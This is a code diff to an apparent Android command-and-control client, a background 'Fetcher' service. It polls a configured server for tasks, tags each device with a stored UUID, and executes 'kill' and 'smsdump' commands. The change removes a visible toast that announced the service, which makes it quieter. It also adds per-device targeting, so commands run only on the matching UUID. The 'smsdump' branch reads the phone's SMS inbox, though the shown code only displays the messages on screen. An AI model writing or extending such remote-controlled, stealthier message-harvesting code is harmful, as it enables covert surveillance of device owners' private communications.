@@ -35,22 +35,18 @@ public class Fetcher extends Service {
     final String FILE_NAME = "test.json";
     final String FULL_URL = "http://"+SERVER_IP+":"+SERVER_PORT+"/"+FILE_NAME;
 
-
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Toast.makeText(getApplicationContext(), "Service successfully invoked", Toast.LENGTH_SHORT).show();
 
         // Check or store UUID to uniquely identify the device
-        SharedPreferences sPrefs= PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
-        String check =sPrefs.getString("uuid",null);
-        if (check == null){
+        SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
+        final String id = sPrefs.getString("uuid",null);
+        if (id == null){
             SharedPreferences.Editor editor = sPrefs.edit();
             UUID uuid = java.util.UUID.randomUUID();
             editor.putString("uuid", uuid.toString());
             editor.commit(); // Store UUID permanently in the device
         }
-
-        final String id =sPrefs.getString("uuid",null);
 
         try{
             if(isConnected()){ // Check if device has a network connection
@@ -130,25 +126,31 @@ public class Fetcher extends Service {
                 try {
                     JSONObject json = new JSONObject(result);
                     String task = json.getString("message");
+                    String machineID = json.getString("uuid");
+                    SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
+                    final String id = sPrefs.getString("uuid",null);
 
-                    if(task.equals("kill")){
-                        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-                        Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
-                        PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
-                        if (alarmManager != null){
-                            alarmManager.cancel(pintent);
+                    if(machineID.equals(id)){
+                        if(task.equals("kill")){
+                            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+                            Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
+                            PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
+                            if (alarmManager != null){
+                                alarmManager.cancel(pintent);
+                            }
+                            stopSelf();
                         }
-                        stopSelf();
-                    }
-                    else if(task.equals("smsdump")) {
-                        if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED){
-                            ArrayList<String> sms = fetchInbox();
-                            Toast.makeText(getApplicationContext(),String.valueOf(sms.size()),Toast.LENGTH_SHORT).show();
-                            for(int i=0;i<sms.size();i++){
-                                Toast.makeText(getApplicationContext(),sms.get(i),Toast.LENGTH_LONG).show();
+                        else if(task.equals("smsdump")) {
+                            if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED){
+                                ArrayList<String> sms = fetchInbox();
+                                Toast.makeText(getApplicationContext(),String.valueOf(sms.size()),Toast.LENGTH_SHORT).show();
+                                for(int i=0;i<sms.size();i++){
+                                    Toast.makeText(getApplicationContext(),sms.get(i),Toast.LENGTH_LONG).show();
+                                }
                             }
                         }
                     }
+
                 } catch (JSONException e) {
                     Log.e("Error",e.getMessage());
                 }
